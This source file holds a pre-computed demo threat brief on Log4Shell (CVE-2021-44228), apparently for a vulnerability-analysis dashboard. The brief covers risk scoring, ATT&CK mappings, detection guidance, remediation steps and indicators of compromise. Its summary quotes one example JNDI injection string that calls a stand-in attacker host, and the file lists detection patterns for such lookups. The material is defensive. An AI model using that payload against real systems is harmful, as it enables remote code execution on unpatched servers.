/**
 * Pre-computed AI brief for demo/showcase deployments.
 * Shown when VITE_DEMO_MODE=true so no live API calls are made.
 */
export const DEMO_BRIEF = {
  cve_id: "CVE-2021-44228",
  model: "gpt-4o-mini (pre-computed)",
  tokens_used: 1842,
  verified: true,
  brief: {
    exploitability_score: 0.97,
    priority: "critical",
    attack_vector: "Network",
    attack_complexity: "Low",
    privileges_required: "None",
    user_interaction: "None",
  },
  llm_analysis: {
    executive_summary:
      "Log4Shell (CVE-2021-44228) is a critical remote code execution vulnerability in Apache Log4j 2 (≤2.14.1) affecting the JNDI lookup feature. An unauthenticated attacker can trigger arbitrary code execution by sending a crafted string (e.g., ${jndi:ldap://attacker.com/a}) to any logged input. The exploit was weaponised within hours of public disclosure, with thousands of exploitation attempts observed within 72 hours. The vulnerability's ubiquity across Java-based enterprise software — cloud platforms, gaming services, financial systems — makes it one of the most broadly impactful CVEs in recent history.",
    risk_assessment:
      "CVSS 10.0 (Critical). Exploitation requires zero authentication and no user interaction over any network-accessible interface that logs attacker-controlled input. Active mass exploitation was confirmed within 12 hours of disclosure. KEV-listed by CISA with a mandatory patch deadline. EPSS score >0.97 — near-certain exploitation in the wild. Wormable exploitation patterns observed across multiple threat actor groups including nation-state actors.",
    attck_analysis: [
      {
        technique_id: "T1190",
        technique_name: "Exploit Public-Facing Application",
        relevance:
          "Attackers target internet-facing Java applications that use Log4j for logging, including web servers, API gateways, and cloud management consoles. Any logged HTTP header (User-Agent, X-Forwarded-For, etc.) serves as an injection point.",
        detection_guidance:
          "Monitor for JNDI lookup patterns (${jndi:) in HTTP request logs, WAF alerts, and outbound DNS/LDAP queries from application servers to unexpected external hosts.",
      },
      {
        technique_id: "T1059.007",
        technique_name: "Command and Scripting Interpreter: JavaScript",
        relevance:
          "Post-exploitation payloads delivered via JNDI callbacks frequently drop JavaScript/Java-based second-stage implants, enabling persistent code execution in the JVM context.",
        detection_guidance:
          "Detect abnormal class loading events in JVM telemetry, unexpected outbound connections from Java processes, and new .class file creation in application directories.",
      },
      {
        technique_id: "T1071.001",
        technique_name: "Application Layer Protocol: Web Protocols",
        relevance:
          "C2 communication is established over HTTP/HTTPS using the JNDI LDAP/RMI callback mechanism. Attackers frequently blend into normal web traffic by using port 443 for callback servers.",
        detection_guidance:
          "Inspect outbound LDAP (port 389/636) and RMI (port 1099) connections from web application servers. Flag any Java processes initiating DNS queries to external resolvers not in approved lists.",
      },
      {
        technique_id: "T1105",
        technique_name: "Ingress Tool Transfer",
        relevance:
          "After initial JNDI callback, attackers download additional tooling (Cobalt Strike beacons, cryptominers, ransomware droppers) from attacker-controlled infrastructure.",
        detection_guidance:
          "Alert on file downloads initiated by Java processes (java.exe / java) to external IPs. Enforce egress filtering and application-layer proxying for all server processes.",
      },
    ],
    remediation_steps: [
      {
        action: "Upgrade Apache Log4j to version 2.17.1 or later immediately",
        rationale:
          "Versions 2.15.0 and 2.16.0 had incomplete fixes; only 2.17.1+ fully mitigates all known variants including CVE-2021-45046 and CVE-2021-45105.",
        priority: "critical",
      },
      {
        action: "Set log4j2.formatMsgNoLookups=true as a JVM flag on all affected services",
        rationale:
          "Provides an immediate short-term mitigation for services that cannot be patched immediately, disabling the JNDI lookup interpolation at the engine level.",
        priority: "critical",
      },
      {
        action: "Block outbound LDAP, RMI, and DNS-over-non-standard-ports at the perimeter",
        rationale:
          "Prevents successful JNDI callback even if the lookup is triggered, breaking the exploit chain at the network layer.",
        priority: "high",
      },
      {
        action: "Deploy WAF rules to detect and block JNDI injection patterns in HTTP inputs",
        rationale:
          "Filters known exploitation patterns in HTTP headers and body before they reach application logging. OWASP, Cloudflare, and AWS have published ready-to-deploy rule sets.",
        priority: "high",
      },
      {
        action: "Audit all Java dependencies using tools like Syft or Grype for transitive Log4j inclusions",
        rationale:
          "Log4j is often included transitively by frameworks (Elasticsearch, Hadoop, Solr, Spark) and may not be obvious from direct dependencies alone.",
        priority: "medium",
      },
    ],
    ioc_suggestions: [
      "Outbound DNS queries containing 'ldap://', 'rmi://', or 'jndi:' in the query string",
      "HTTP requests with User-Agent, X-Forwarded-For, or custom headers containing '${jndi:'",
      "New .class files created in Java application classpath directories at runtime",
      "Unexpected outbound connections on TCP 389, 636, 1099, or 1389 from application servers",
      "Java processes spawning child shell processes (bash, sh, cmd.exe, powershell.exe)",
    ],
    confidence_notes:
      "This analysis reflects the vulnerability as known at the time of brief generation. Threat actor TTPs continue to evolve; monitor CISA KEV catalog, NVD, and vendor advisories for updated guidance. The remediation priority ordering assumes a production internet-facing environment; adjust based on network exposure and asset criticality.",
  },
};
